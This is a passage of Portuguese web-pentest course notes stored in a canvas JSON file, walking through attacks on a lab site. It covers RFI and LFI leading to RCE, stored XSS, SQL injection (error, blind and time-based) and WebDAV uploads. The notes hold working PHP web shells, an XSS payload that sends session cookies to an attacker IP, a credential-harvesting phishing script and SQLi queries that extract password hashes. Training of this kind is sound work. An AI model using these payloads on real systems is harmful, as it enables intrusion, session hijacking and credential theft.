\n```kali\nnano ricardo.html\nTESTE\n```\n\nVamos iniciar um servidor web em python\n```kali\npython -m SimpleHTTPServer 8080\n```\n\nVamos na url novamente e colocar o nosso servidor com o nosso arquivo\n```\n172.16.1.10/turismo/link.php?link=http://172.90.0.137:8080/ricardo.html\n```\n![[brave_ZJFDrtxWyl.png]]\n\nSabendo disso vamos enviar um arquivo com uma shell\n```kali\nnano shell.html\n\n<?php system($_GET['desec']); ?>\n```\n![[brave_8jcxN9sx3z.png]]\n\nagora basta definirmos o parametro desec na url\n```\n172.16.1.10/turismo/link.php?link=http://172.90.0.137:8080/shell&desec=pwd\n```\n![[brave_f0IdOinjJD.png]]\n","x":13930,"y":-3221,"width":749,"height":1100,"color":"1"},
		{"id":"5413c0a4b44b5781","type":"text","text":"## Stored XSS (Sequestro de Sessão)\n\no xss armazenado em um dos mas criticos\n![[brave_F1JFvKVMfa.png]]\n\nnos temos um campo de busca que novamente reflete oque nos escrevemos no campo e ele tem a vulnerabilidade de xss refletido, mas nao e oque queremos\n![[brave_BjVrmHA3D4.png]]\n\ntemos um outro campo que se chama feedback\n![[brave_Ls49bdF7tq.png]]\n\nVamos mandar alguns dados para ele\n![[brave_2PHp4WAiKi.png]]\n\nvemos que esta funcionando o nosso script\n![[brave_zMNnHvVjxC.png]]\n\nmas oque e interesante e que ele acabou ficando gravado dentro do site, entao toda vez que alguem clicar nele ele vai funcionar\nno casso este ponto branco e nosso comentario\n![[brave_5vy3TZsZPb.png]]\n\nse voltarmos para a pagina inicial vamos ver nosso comentario e toda vez que clicarmos nele o script vai executar\n![[brave_7V2dmopvMH.png]]\n\nisso funciona pois ele grava o nosso arquivos no banco de dados, e por isso que e chamado de xss armazenado, ou seja todo mundo tem acesso a ele \n\nvamos tomar vantagem disso\nvamos primeiramente pegar o cookie da secao\nno campo de pesquisa vamos enviar um alert\n```\n<script>alert(document.cookie)</script>\n```\n![[brave_AXGlqADluU.png]]\n![[brave_sLWsJOIENy.png]]\n\neste cookie mostra qual e a seção no momento, entao todo mundo que acessa esta aplicação e tenta se autenticar ou quem esta autenticado nesta aplicação recebe um seção valida\n\nou seja se nos temos um campo com o stored xss podemos jogar um payload na qual que todo mundo acessar a pagina vai executar uma determinada acao, esta acao poderia ser acessar o nosso endereço ip e enviar o cookie para nos \n\nVamos abrir um servidor web na nossa maquina\n```kali\npython -m SimpleHTTPServer 8080\n```\n\nVamos gerar a nossa payload\n```\n<script>new image().src=\"http://172.20.1.120:8080?=\"+document.cookie;</script>\n```\n![[brave_ILUzAJUoiY.png]]\n\nagora toda vez que alguem clicar no link o cookie da secao do alvo sera enviado para nos\n![[brave_qwTWd9C1nX.png]]\n\nagora oque vamos fazer e trocar o nosso cookie pelo de outra pessoa\n```\n<script>alert(document.cookie=\"PHPSESSID=j3o132jo13h231b32f\")</script>\n```\n\nfeito isso conseguimos acessar a area administrativa\n![[brave_vqAg7K5YSh.png]]\n","x":12090,"y":-5820,"width":749,"height":1100,"color":"1"},
		{"id":"35c85bb74aa1a6e2","type":"text","text":"## Self-XSS\n\nEste tipo de xss diferentemente no anterior ocorre em outro local\n\nOlhando o codigo fonte da pagina podemos ver um arquivo procurar.php\n![[brave_kL4Tgpx4pJ.png]]\n\npodemos tentar inserir o xss diretamente nele\nprimeiro vamos ver como a pagina se comporta\n```\n172.16.1.10/turismo/procurar.php/\n```\nvemos que a pagina ficou completamente quebrada\n![[brave_NU7qXX554m.png]]\n\nvamos ver o codigo fonte dela\nvemos que a nossa / foi para dentro do codigo\n![[brave_y0VlDdJfYD.png]]\n\nou seja se ele aceitou a nossa / nos poderiamos fechar este action e mandar um codigo para la, vamos fazer isso\n```\n172.16.1.10/turismo/procurar.php/\"><script>alert(\"desec\")</script>\n```\n![[brave_gFYGsiKU0Z.png]]\n![[brave_PdlUqqaiN1.png]]\n\n","x":13010,"y":-5820,"width":749,"height":1100,"color":"1"},
		{"id":"c7ff902dc4775421","type":"text","text":"## XSS (Cross Site Scripting - Refletido)\n\no tipo refletido de xss e o mais simples e mas basico de xss\n\nele ocorre quando temos um campo de busta e tudo que pesquisamos e refletido na pagina de busca\n\ncomo vimos temos um campo de busca\n![[brave_UaR5ux30vW.png]]\n\nse nos digitarmos teste e formos ver o codigo fonte vemos que o teste foi para o nosso codigo fonte\n![[brave_UZja3Z2CZd.png]]\n\npodemos tentar enviar codigos tambem como de javascript, vamos fazer um teste\n```\n<script>alert(\"ola\")</script>\n```\n![[brave_GkfVyTzGGX.png]]\n\nquando enviamos isso para o servidor nos recebemos um alerta do site, mostrando que e possivel executar um script\n![[brave_p3ZjoCQrt1.png]]\n\nvamos olhar o codigo fonte\n![[brave_YlY5n2t36v.png]]\n\nbom em alguns casos o site vaii bloquear este tipo de coisa, mas para isso temos varias payloads que podemos tentar para dar o bypass, para isso podemos usar a ferramenta https://github.com/LasCC/Hack-Tools\n\nvamos ver oque mas podemos fazer com o xss\n```\n<script>alert(document.cookie)</script>\n```\n![[brave_t6wS3Ii4Rn.png]]\n\n```\n<script>alert(document.location=\"http://google.com\")</script>\n```\n\n","x":13930,"y":-5820,"width":749,"height":1100,"color":"1"},
		{"id":"01c35c4871a00676","type":"text","text":"## Automatizando os testes de XSS\n\nTemos um script que se chama XSStrike\nhttps://github.com/s0md3v/XSStrike\n\nPodemos baixar ela na nossa maquina \n```kali\ngit clone https://github.com/s0md3v/XSStrike.git\ncd XSStrike\n```\n\nVamos executar ele da forma mas simples\n```kali\npython3 xsstrike.py -u \"http://172.16.1.10/procurar.php?busca=\"\n```\n![[brave_R6DZVIcjVN.png]]\n\nVamos executar outra forma que e quando voce nao passa o parametro mas apenas a pagina\noque ele vai fazer e identificar uma parametro valido\n```kali\npython3 xsstrike.py -u \"http://172.16.1.10/procurar.php\" --params\n```\n![[brave_69UpXMDBJa.png]]\n\numa outra forma e para caso voce queira testar o self XSS\n```kali\npython3 xsstrike.py -u \"http://172.16.1.10/procurar.php/\" --path\n```\n![[brave_7d0oVvEryW.png]]\n","x":11086,"y":-5820,"width":749,"height":1100,"color":"5"},
		{"id":"5c980f8f47256cf9","type":"text","text":"## Open Redirect - Parâmetro Codificado\nAlgumas vezes iremos encontrar  open redirect com o parametro codificado\n![[brave_X0s6qXwB7o.png]]\n![[brave_GbYUEB5LnU.png]]\n\neste valor que vemos acima e base64  entao se pegarmos este valor podemos decodificar ele  no kali\n```kali\necho \"gb1gv2t3v1w\" | base64 -d\n```\n![[brave_pR9wfSjc2n.png]]\n\nse nos quisermos mandar qualquer valor temos que encodalo para base64\n```kali\necho \"http://google.com\" | base64\n```\n![[brave_KPf4QQ01UY.png]]\n![[brave_sN1vSsLlQw.png]]\n\n","x":11086,"y":-4519,"width":749,"height":1100,"color":"5"},
		{"id":"9baeb5e817ee30df","type":"text","text":"## Open Redirect\n\nPara encontrar o open redirect precisamos encontrar algo da pagina que tenha pontos de redirecionamento\n\nna pagina temos 2 links com o redirecionamento\n![[brave_unRpuZnwbC.png]]\n\no ploblema mesmo e o metodo de como ele esta fazendo este redirecionamento,\nse nos copiarmos o link vemos com ele esta montado, da para fazer isso com proxy tambem \n![[brave_S29vIFfKkp.png]]\n\nvemos que a pagina esta chamando o arquivo redir.php e usando o parametro url que esta redirecionando para o facebook\n```\nhttp://172.16.1.10/redir.php?url=https://facebook.com/mrturismo20\n```\n![[brave_odb39Ndrtw.png]]\n\no ploblema e quando nos temos o controle deste campo de redirecionamento podendo entao colocar qualquer link, ate mesmo para um site falso\nolha so fazendo o e redirecionando ele para pagina do google simplesmete ja mostra que esta vulneravel\n```\nhttp://172.16.1.10/redir.php?url=https://google.com\n```\n![[brave_b0I1muDKRl.png]]\n\no risco e que podemos mandar um link do site original com um redirecionamento baixando um arquivo malicioso ou entao um site de phishing, tornando isso um bela vulnerabilidade\n","x":12090,"y":-4519,"width":749,"height":1100,"color":"4"},
		{"id":"84d848c130f4f9c2","type":"text","text":"## Burlando autenticação via métodos\n\nUma coisa que podemos fazer e forcar os metodos http quando estamos fazendo uma determinada requisicao \n\nem um cenario em que voce tem uma autenticacao, entao tudo que voce tenta fazer ele sempre da erro se nao tiver a autenticacao correta, entao voce forca outro metodo http que voce sabe que o servidor aceita  e as vezes se ele nao tiver limitado aquele metodo voce consegue burlar a autenticacao \n\nOs metodos aceitos sao ``OPTIONS,HEAD,GET.POST``\n\ntemos um diretorio logs que tem uma autenticacao restrita\n![[brave_MRCX6kV4bI.png]]\n![[brave_ZnljqYZiBE.png]]\n\nOque nos podemos fazer e tentar forcar um tipo de requisicao \nquando fazemos isso ele retorna a pagina html\n```kali\ncurl -v -X POST http://172.16.1.10/logs/\n```\n![[brave_83PNwWJXGV.png]]\n\nPodemos mandar isso para um arquivo .html\n```kali\ncurl -X POST http://172.16.1.10/logs/ > index.html\n```","x":12090,"y":-3221,"width":749,"height":1100,"color":"1"},
		{"id":"59a179c2560cb399","type":"text","text":"## Explorando o Método PUT e Webdav\n\n![[brave_EF0UYMxwxY.png]]\n\nprotocolo webdav\n![[brave_XsOkBKW6pL.png]]\n\nVamos para a pratica\nOque esta acontecendo aqui e que estamos enviando um comando em php para o servidor \n```kalii\ncurl -v -X PUT -d \"<?php system(id);?>\" http://172.16.1.10/webdav/teste.php\n```\n![[brave_YOZFje8w3X.png]]\nvemos que o arquivo foi criado no servidor \n![[brave_3Rcm9KVj1W.png]]\nagora quando clicamos nele vemos que o arquivo executou o nosso comando\n![[brave_OFlNiu4hvq.png]]\n\numa outra forma de fazer isso e atravez do GET\n```kalii\ncurl -v -X PUT -d \"<?php system(\\$_GET[\"desec\"]);?>\" http://172.16.1.10/webdav/shell.php\n```\nagora passando o parametro ``?desec=`` tudo que vier de comando depois do = sera reconhecido\n![[brave_sBWIO3vkZS.png]]\n![[brave_phYVDND0GQ.png]]\n\nUma outra forma de fazer e agente criar ja um arquivo shell e enviar ele para o servidor\n![[brave_ZpeNKVimeU.png]]\n\nvamos colocar o nosso arquivo dentro do servidor pelo curl\n```kali\ncurl -v http://172.16.1.10/webdav/ --upload-file shell.php\n```\n![[brave_i44aCG2Qno.png]]\n\n---\n\nVamos ver um pouco sobre webdav usando ferramentas\n```kali\ncadaver http://172.16.1.10/webdav/\n```\n![[brave_uPlTrVGxJc.png]]\n![[brave_t7rT8nqcdd.png]]\n\noutra ferramenta e o davtest\n```kali\ndavtest \n```\n![[brave_hJnkEBayXQ.png]]\n\n```kali\ndavtest --url http://172.16.1.10/webdav/\n```\n![[brave_vvDjEjdDsp.png]]\n","x":11086,"y":-1923,"width":749,"height":1100,"color":"5"},
		{"id":"a0454d1b1d3ccef9","type":"text","text":"## Identificando a superfície de ataque\n\nbasicamente e uma coleta de informacoes para achar e localizar o local de ataque, anteriormente no comeco do ataque fizemos todo um reconhecimento e agora precissamos achar o vetor de ataque olhando para o sistema para entender como ele funciona, quais recursos ele oferece e quais sao os possiveis pontos de entrada\n\n![[brave_itxxrMLj9i.png]]\n\nTemos aqui o campo de login\n![[brave_nBtb8YjpKY.png]]\n\nTemos tambem um de cadastro\n![[brave_N24Pp4yizP.png]]\n\nTemos um campo de ativacao de conta\n![[brave_dshqhmy5Hv.png]]\n\nTemos um capo de pesquisa\n![[brave_FS5CHZcuU5.png]]\n\n","x":12090,"y":-1923,"width":749,"height":1100,"color":"4"},
		{"id":"70c165c2388777b6","type":"text","text":"## LFI (Local File Inclusion)\n\nEsta falha esta aqui em sobre nos \n![[brave_7vKAISG25b.png]]\n\nna url temos um parametro ``p=sobre.php\n```\n172.16.1.10/turismo/info.php?p=sobre.php\n```\n![[brave_v2kWvtzuKN.png]]\n\ne justamente aqui que acontece a falha se nos colocarmos uma aspas simples depois do sobre.php ele vai nos retornar um erro\n```\n172.16.1.10/turismo/info.php?p=sobre.php'\n```\neste erro fala que nao foi possivel incluir o arquivo\ninclude()\n![[brave_DlF4RUTlF2.png]]\n\nna visao do codigo que a pessoa usou e basicamente isso \n![[brave_8kecBNJOPG.png]]\n\nlembra que no nosso site temo um aquivo chamado login.php, oque podemos fazer e chamar ele com esta falha\n```\n172.16.1.10/turismo/info.php?p=login.php\n```\n![[brave_K6B0YZGwDk.png]]\n\nO geito que nos exploramos ela e comecar a informar nomes de arquivos ou nome dos arquivos de sistema, vamos fazer isso\n```\n172.16.1.10/turismo/info.php?p=/\n```\n![[brave_XLf3klofT1.png]]\n\n```\n172.16.1.10/turismo/info.php?p=/../\n```\n![[brave_skOzCpl5xy.png]]\n\ne por assim vai ate chegarmos na raiz \n```\n172.16.1.10/turismo/info.php?p=/../../../../\n```\n![[brave_V6fTAeJNAo.png]]\n\nNa raiz podemos perguntar por qualquer arquivo que quisermos \n```\n172.16.1.10/turismo/info.php?p=/../../../../etc/passwd\n```\n![[brave_izTef4Ldkh.png]]\n\nessa e a versao mas recente do php, mas em algumas versoes mas antigas e um pouco diferente\n```\n172.16.1.231/index.php?page=/../../etc/passwd\n```\n![[brave_7wwxdW1fah.png]]\n\nele vai dar um erro, isso porque ele esta automaticamente colocando um .php no final de cada arquivo, oque podemos fazer para dar um bypass nisso e colocar um null byte \n```\n172.16.1.231/index.php?page=/../../etc/passwd%00\n```\n![[brave_lCnwXzYtLO.png]]\n","x":13010,"y":-1923,"width":749,"height":1100,"color":"1"},
		{"id":"e6dc42f8b9c20077","type":"text","text":"## De LFI a RCE - Infecção de Logs\n\nCaso conseguimos ter acesso a algum arquivo de log com o lfi nos conseguimos infectar este log e mandar um log com uma shell reversa, mas isso caso conseguimos ler ou interagir com o log\n\nEntao temos nosso LFI \neste servidor esta rodando apache, entao vamos entrar nos logs do apache\n```\n172.16.1.10/turismo/info.php?p=/../../../../var/log/apache2/access.log\n```\n![[brave_UGiZAWChue.png]]\n\nse nos conseguimos ler o arquivo de logs do apache, logo se interagirmos com o apache ele vai gerar um log, vamos confirmar isso fazendo uma requisicao para o servidor\n```\n172.16.1.10/MINHAREQ\n```\n![[brave_gmGrDQb8le.png]]\n\nVamos ver se isso criou um log no apache\nvemos que foi criado um log como minhareq, logo conseguimos gerar logs no servidor\n![[brave_y8ImaQUgTY.png]]\n\nvamos fazer o nosso arquivo malicioso ou seja nossa shell em php\n```shell.php\n<?php system($_GET['desec']); ?>\n```\n\nAgora vamos nos conectar ao servidor usando o nc e mandar este arquivo para la\n```kali\nnc -v 172.16.1.10 80 -C\n<?php system($_GET['desec']); ?>\n```\n![[brave_g1T6knuSCX.png]]\n\nquando voltamos para nosso logs vemo que deu um erro\n![[brave_PWOVrXE0ME.png]]\n\nisso e normal pois ele esta tentando executar a system e para isso precisamos passar um parametro na url \n```\n172.16.1.10/turismo/info.php?p=/../../../../var/log/apache2/access.log&desec=id\n```\nse descermos ate o final vemo que e executado o comando id\n![[brave_Mz7ABnU4vM.png]]\n\n","x":13930,"y":-1923,"width":749,"height":1100,"color":"#1100ff"},
		{"id":"1c36f68a52774387","type":"text","text":"## Explorando Vulnerabilidades","x":11211,"y":-360,"width":500,"height":80,"color":"6"},
		{"id":"2fc0618a7d1d2399","type":"text","text":"## Bypass Client Side\n\ntemos um cupom desativado\n![[brave_YlTqjk3kRY.png]]\n\noque sera que consegiumos fazer com ele caso conseguimos dar o bypass no client side\npodemos tirar o max length\n![[brave_HjNhLGLYvC.png]]\n\nalem de conseguimos fazer outra varias coisas no burp\n","x":11086,"y":-6560,"width":749,"height":550,"color":"5"},
		{"id":"312b50828a050e2c","type":"text","text":"## PoC - Criando páginas falsas\n\nva nas opcoes do seu navegador e clique em salvar pagina como\n![[brave_DunnrdzuJ0.png]]\n\na pasta vai esta na parte aonde voce a baixou\n![[brave_STUwz39rph.png]]\n\nvamos abrir o index.html e editar algumas coisas para pegar os dados de login do usuario com o open redirect\n```kali\nnano index.html\n```\n\nA primeira coisa que vamos fazer e no formulario no metodo action, vamos colocar login.php que e um arquivo que vamos escrever para capturar dados\n![[brave_w1b7B1vTcE.png]]\n\nagora vamos mover o index.html e  o index_files para dentro da nossa pasta de web server\n```kali\nmv index.html /var/www/html/\nmv index_files /var/www/html/\ncd /var/www/html/\n```\n![[brave_anNqWDQB7B.png]]\n\nagora vamos criar um arquivo de senhas\n```kali\ntouch senhas.txt\nchmod +x senhas.txt\n```\n\nvamos criar o nosso arquivo malicioso login.php\n```login.php\n<?php\n$caixa1 = $_POST[\"login\"] . \"\\n\";\n$caixa2 = $_POST[\"senha\"] . \"\\n\";\n\n$file = fopen(\"senhas.txt\",\"a\");\n\n#escrever1 = fwrite($file,$caixa1);\n#escrever2 = fwrite($file,$caixa2);\n\nfclose($file);\n\nheader(\"Location: http://172.16.1.10/turismo/login.php\");\n?>\n```\n\nagora basta iniciarmos o apache \n```kali\nservice apache2 start\n```\n\nagora colocamos o link do nosso servidor apache como link de redirecionamento\n![[brave_YmJ2a48pp8.png]]\n","x":11086,"y":-3221,"width":749,"height":1100,"color":"5"},
		{"id":"f2f303a711a801c5","type":"text","text":"## Do SQLi até o RCE\n\nVamos de um sqli ate um rce\n\nantes disso uma coisa interesante e que temos o load file que permine ver arquivos do sitema operacional \n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,load_file(\"/etc/passwd\") %23\n```\n![[brave_nSiAYWkUG7.png]]\n\nVamos ao ataque, que seria uma forma de escrever dados no servidor\noque nos podemos fazer e usar o comando abaixo, mas isso ira retornar um erro de permisao negada pois nao temos permisao para escrever arquivos neste diretorio\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,\"desec\" INTO OUTFILE \"var/www/html/turismo/desec.txt\" %23\n```\n![[brave_mDletDnoLn.png]]\n\nPrecisamos achar um diretorio com permisao de escrita, com o reconhecimento de diretorio de erro e teste nos conseguimos talvez achar um diretorio \n\ncom o diretorio com permisao vamos continuar o ataque\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,\"desec\" INTO OUTFILE \"var/www/html/turismo/banners/desec.txt\" %23\n```\n![[brave_ela1sHYZ6D.png]]\n\nVamos ver se o arquivo foi gerado\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,load_file(\"var/www/html/turismo/banners/desec.txt\") %23\n```\n![[brave_weV9TJbMp0.png]]\n\nAgora em vez de excrever uma palavra vamos colocar a nossa shell dentro do arquivo\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,\"<?php system($_GET[\"desec\"])?>\" INTO OUTFILE \"var/www/html/turismo/rce.php\" %23\n```\n\nagora com a nossa payload dentro do servidor basta entrar nela \n```\n172.16.1.10/turismo/banners/rce.php?desec=id\n```\n![[brave_4CxzPju1QX.png]]\n\n\n","x":12090,"y":-8520,"width":749,"height":1100,"color":"#0000ff"},
		{"id":"b1176173240d4fc5","type":"text","text":"## SQLi Information Schema\n\nDepois de descobrir algumas informacoes podemos fazer algumas consultas\n\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,version(),user(),database() %23\n```\n![[brave_CfuSpz8gO7.png]]\n\nsabemos que o nome do nosso banco de dados e dbmrtur, vamos fazer algumas consultas\nVamos pegar todas os nomes de tabelas que tem em information_schema\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables %23\n```\n![[brave_stgPF63l3I.png]]\n\nPodemos ser mas especificos pedindo apenas no nome dbmrtur\nele vai trazer apenas oque e referente a dbmrtur\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables where table_schema=\"dbmrtur\" %23\n```\n![[brave_l4IvJU2S5k.png]]\n\nVamos ver as colunas da tabela mrusers\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,column_name,4,5 from information_schema.columns where table_schema=\"dbmrtur\" %23\n```\n![[brave_K0tdYSLHfT.png]]\n\npodemos ser mas especifico tambem perguntando aonde e referente apenas a tabela mrusers\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,column_name,4,5 from information_schema.columns where table_schema=\"dbmrtur\" and table_name=\"mrusers\"%23\n```\n![[brave_wYqPpBShoj.png]]\n\nsabendo disso tudo vamos fazer uma consulta direta, perguntando o nome , login e senha \n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,nome,login,senha from mrusers\"%23\n```\n![[brave_T6hXKZ3Pro.png]]\n\ne agora basta apenas quebrar as hashes e logar no site \n","x":12090,"y":-9760,"width":749,"height":1100,"color":"#0000ff"},
		{"id":"ba41e0e81b25fc29","type":"text","text":"## Explorando SQLi manualmente\n\nidentificamos o sql error based no site abaixo\n```\n172.16.1.10/turismo/agencias.php?loja=sbc\n```\n\ntemos um campo de destinos\n![[brave_m2dVHo9mw9.png]]\n![[brave_ZKpdS5fPM1.png]]\n\naqui quando clicamos em uma delas ela vai nos levar a outro local com uma vulnerabilidade de based error, no casso esta no id dessa vez\nconfome vamos mudando o valor de id ele vai nos passando de pagina em pagina\n```\n172.16.1.10/turismo/destinos.php?id=1\n```\n![[brave_n9No6RAgFc.png]]\n\nse nos colocarmos uma aspas simples ele vai reclamar\n```\n172.16.1.10/turismo/destinos.php?id=3'\n```\n![[brave_OXShRRN6iX.png]]\n\naqui temos uma pequena diferenca comparado as aulas passadas\nse nos colocarmos um order by 500\n```\n172.16.1.10/turismo/destinos.php?id=3' order by 500 %23\n```\nele vai continuar a dar o erro de syntax sql\n![[brave_3TVnFw0sfd.png]]\n\nou seja, sempre que der este erro de sql syntax significa que esta quebrado e nao esta chegando ao banco de dados, entao neste caso precisamos remover as aspas simples\no motivo disso e que precisamos mandar o id correto e depois a nossa consulta\n```\n172.16.1.10/turismo/destinos.php?id=3 order by 500 %23\n```\nagora sim ele da o erro que queremos, ou seja o banco de dados retorna para nos que nao existe uma coluna ate 500\n![[brave_P7KzsT6UaB.png]]\n\ne agora e so voce ir enumerando da mesma forma que foi mostrado\n\n---\n\nvamos validar isso e ir um pouco mas afundo que no caso e em outro site\naqui temos um vetor de ataque\n![[brave_ltc98Zlbx5.png]]\n![[brave_c20QVsuaDu.png]]\n\nvamos ver se temos o sql\n```\n172.16.1.7:8080/cat.php?id=3'\n```\n![[brave_UbUuXtVaT8.png]]\n\ne aqui e a mesma coisa que ja foi visto","x":13000,"y":-9760,"width":749,"height":1100,"color":"#0000ff"},
		{"id":"b59be8ec17b45638","type":"text","text":"## Bypass addslashes\n\nquando o desenvolverdor cria o codigo ele pode usar uma funcao do php chamada addslashes que adiciona uma barra\n\nVamos ver um exemplo sem o addslashe\n```\n172.16.1.10/turismo/destinos.php?id=1'\n```\n![[brave_sebvxIOaCK.png]]\n\nVamos ver agora com o addslashe\n```\n172.16.1.10/turismo/exclusivo.php?id=1'\n```\n![[brave_cSXJzeFbRv.png]]\n\nse no lugar do ' colocarmos uma barra ele ira ficar com 2 barras\n```\n172.16.1.10/turismo/exclusivo.php?id=1\\\n```\n![[brave_76ybxYGqMH.png]]\n\nmesmo assim conseguimos pegar as tabelas existentes\n```\n172.16.1.10/turismo/exclusivo.php?id=1 union select 1,table_name,3,4,5 from information_schema.tables\n```\n![[brave_B8XPE2uRSn.png]]\n\nmas casso voce queira filtrar isso nao vai funcionar pois ele vai adicionar barras\n```\n172.16.1.10/turismo/exclusivo.php?id=1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=\"dbmrtur\"\n```\n![[brave_AsEygt17Fk.png]]\n\noque podemos fazer para dar o bypass e converter as strings para decimal\n![[brave_T5av1vzvNt.png]]\n![[brave_Y1UsVTsfAh.png]]\n![[brave_GDgepHNpke.png]]\n\nVamos fazer isso\n```kali\necho -n \"desec\" | od -An -tdC\n```\n![[brave_MvCS9Ybu1Z.png]]\n\nagora em vez de colocar uma string colocamos o ascii\n```\n172.16.1.10/turismo/exclusivo.php?id=1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=char(100,101,115,101,99)\n```\n![[brave_npQxerLfDx.png]]\n\n","x":13930,"y":-9760,"width":749,"height":1100,"color":"#0000ff"},
		{"id":"6d996a1a8074ac50","type":"text","text":"## SQL Injection em PostgreSQL\n\nE outro tipo de sql error based mas so quem em outro banco de dados\n\nTemos mas um site para postgreSQL\n```\n172.16.1.9/cat.php?id=1'\n```\n![[brave_Mw3eyM8x4S.png]]\n\nnotamos que ele nao deu um erro de mysql e sim um de pg_exec()\nse dermos uma pesquisada no google encontramos que isso e especifico do postgreSQL\n![[brave_ePlN1VxPyx.png]]\n\noque nos podemos fazer e a nossa enumeracao padrao ate quebrarmos o site\n```\n172.16.1.9/cat.php?id=1 order by 5\n```\n![[brave_NYGy5AgIMZ.png]]\n![[brave_SzMAXZbAw4.png]]\n\nNo caso do postgre ele nao vai aceitar os numeros \n```\n172.16.1.9/cat.php?id=1 union select 1,2,3,4\n```\n![[brave_1nGorPgeIq.png]]\n\noque podemos fazer e colocar null\n```\n172.16.1.9/cat.php?id=1 union select null,null,null,null\n```\n![[brave_97il0w9Dmz.png]]\n\noque nos podemos fazer agora e colocar aspas simple de um por um em cada null ate retornar algo \n```\n172.16.1.9/cat.php?id=1 union select null,'null',null,null\n```\n![[brave_inNOmtrTdr.png]]\n\npodemos alterar o nome tambem\n```\n172.16.1.9/cat.php?id=1 union select null,'desec',null,null\n```\n![[brave_7AaX0ZKyxp.png]]\n\napartir daqui podemos fazer a pesquisa normalmente\n```\n172.16.1.9/cat.php?id=1 union select null,'version()',null,null\n```\n![[brave_AhlKUQAVr6.png]]\n\n```\n172.16.1.9/cat.php?id=1 union select null,table_name,null,null frfom information_schema.tables\n```\n![[brave_YP94ndgMoN.png]]\n","x":14840,"y":-9760,"width":749,"height":1100,"color":"#0000ff"},
		{"id":"833a8d2bd7f13af8","type":"text","text":"## Blind POST SQL Injection\n\nVamos dar uma olhada em um exemplo mas realistico de blind post sql injection\nVetor de ataque 1\n![[brave_0AgEMPkUOg.png]]\n\nVetor de ataque 2\n![[brave_T6hutUpuf1.png]]\n\nna parte de ativar a conta quando cadastramos um usuario e vamos nela para ativar a conte ele retorna algo da qual podemos explorar\n![[brave_96mKVeUakB.png]]\n![[brave_rW84erJwJS.png]]\n\nPara identificar se esta vulneravel vamos abrir o burp suit e verificar isto\naqui nos temos a requisicao que enviamos\n![[brave_kxukMZ87eq.png]]\n\nNos mandamos esta requisicao para o repeater para que posamos manipular ela\n![[brave_kEnBH7ZfJP.png]]\n\noque nos precisamos fazer e verificar o campo de login para ver se ele e vulneravel, para isso nos podemos enviar as aspas simples\n```\nlogin=ricardo'\n```\n![[brave_voXB9wPZWN.png]]\n\nvemos que ele nao retorna nenhum erro, e voce poderia pensar que o servidor nao e vulneravel a sql, mas so que isso e um blind sql e nao um based error, vamo fazer a requisicao correta\n```\nlogin=ricardo' and 2=2#\n```\n![[brave_S2NpNrnKpS.png]]\n\no aplicativo retorna usuario ativado com uma logica verdadeira, mas e se mandarmos uma logica falsa o usuario sera inexistente, ou seja a aplicacao e vulneravel a blind sql\n```\nlogin=ricardo' and 2=1#\n```\n![[brave_4dK9Dp47gi.png]]\n\nAntes de continuar com o ataque nos precisamos entender alguns conseitos base no mysql\n\nse nos pedirmos um ``select database();`` ele ira nos retornar os bancos de dados\n![[brave_cwDsSJXahl.png]]\n\nVamos ver o tamanho dessa base de dados\n```\nselect length(database());\n```\n![[brave_pyuTnc74l0.png]]\n\npodemos usar substrings tambem\n```\nselect substring(\"mysql\",1,1)\n```\n![[brave_q5NrLYnFS3.png]]\n![[brave_G59dgX3lBk.png]]\n\nBasicamente quando se e um blind sql nos fazermos assim, letra por letra ou informacao por informacao\n\nsabendo disso vamos ao ataque\nVamos tentar descobrir o nome do banco de dados\nlembrando que podemos usar um conversor de string para base64\n```\nlogin=ricardo' and database() = char(116,117,114) #\n```\n![[brave_04vGZS5GPA.png]]\n\nquando acertamos o nome da database\n![[brave_3bz2Q4lhXC.png]]\n\noque podemos fazer para facilitar e ver o tamanho da database\n```\nlogin=ricardo' and length(database()) = 7 #\n```\n![[brave_1FLLorrYNh.png]]\n\ne assim vai ate conseguimos oque queremos, oque e bem demorado, por exemplo a enumeracao de letra em letra\naqui estamos verificando a 1 letra\n```\nlogin=ricardo' and ascii(substring(database(),1,1)) = 100 #\n```\n![[brave_CyzrgdbXk7.png]]\n![[brave_6fhD5Nkv3r.png]]\n\nE assim se inicia uma longa enumeracao\ntamanho do agrupamento de tabelas\n```\nlogin=ricardo' and (select length(group_concat(table_name)) = 35 from information_schema.tables where table_schema=\"dbmrtur\") #\n```\n![[brave_VrfLSedb6o.png]]\n\nVamos extrair as informacoes\n```\nlogin=ricardo' and ascii (substring((select group_concat(table_name) = 35 from information_schema.tables where table_schema=\"dbmrtur\"),1,1)) = 97 #\n```\n![[brave_bL4AtmRWNG.png]]\n\nVamos pegar estas informacoes\n```\nlogin=ricardo' and ascii (substring((select login from adm limit 0,1),1,1)) = 44 #\n```\n![[brave_mZQLXmbaXT.png]]\n","x":13010,"y":-8520,"width":749,"height":1100,"color":"#0000ff"},
		{"id":"ed690a4e2739f212","type":"text","text":"## Time Based SQL Injection\n\nneste caso e um sql injection baseado no tempo\n![[brave_7IjKaaXDmB.png]]\n\nse nos colocarmos uma aspas simples nao retorna erro ate porque e um sql injection baseado em tempo\nvamos testar ele\n```\ncupom=' or sleep(3)#\n```\n![[brave_3RXKx6LnNU.png]]\n\noque vai acontecer se ele estiver vulneravel e que ele vai esperar 3 segundos ate retornar algo no response\n\ne ai que tmb e um sql chato e demorado pois e a mesma coisa que o blind mas so que com tempo\n```\ncupom=' or if(length(database())=2, sleep(3),0)#\n```\n\npodemos fazer assim tambem\n![[brave_JyXkJliWUj.png]]\n```\ncupom=' or if(database() = char(100,123), sleep(3),0)#\n```","x":13930,"y":-7175,"width":749,"height":1100,"color":"1"},
